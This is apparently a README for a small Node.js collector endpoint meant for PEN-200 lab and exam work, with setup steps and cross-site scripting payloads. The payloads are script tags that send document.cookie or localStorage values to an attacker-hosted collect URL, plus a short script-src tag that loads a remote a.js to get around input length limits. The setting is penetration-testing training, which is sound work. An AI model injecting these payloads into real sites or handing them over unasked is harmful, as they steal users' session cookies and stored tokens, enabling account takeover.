# PEN-200-XSS

I created this simple XSS API endpoint for PEN-200 lab machines and the exam.

You need to install Node.js and NPM in your Kali linux.

```bash
sudo apt update
sudo apt install nodejs
sudo apt install npm
```

After the installation, make sure to run the following commands to see the installation is completed.

```bash
node -v
npm -v
```

And clone this repo or if you don't have git in your Kali, you can download it and run the following command to install Express.js.

```bash
npm install
```

## Usage

Firstly, run Node.js server.

```bash
npm run node
```

The endpoint will be `http://[your_ip_address]:3000/collect`.

Secondly, inject the following code in the target system.

```html
<script>
	fetch('http://[your_ip_address]:3000/collect?data' + document.cookie);
</script>
```

The example above sends cookies to the server and logs it in the text file `log.txt` in the root directory.

If you need a value from local storage, replace `document.cookie` with `localStorage.getItem("[key_name]")`.

## When input field has a character length constraint

Sometimes you find weak input fields that doesn't sanitize user inputs, but it only accepts X amount of characters, like 50 characters for instance.

The above example won't work, and in that case you should create a js file with the following content.

```JavaScript
fetch('http://[your_ip_address]:3000/collect?data' + document.cookie);
```

Name the file as `a.js` and load it with a script tag.

```html
<script src=http://[your_ip_address]/a.js>
```

Now instead of injecting the `fetch` code into the input field, you can inject the script tag to bypass the constraint.

`a.js` should be hosted by SimpleHTTPServer or other server of your choice.

I recommend to set the port to 80, so you don't need to include the port number in the URL which shortens overall character length. 
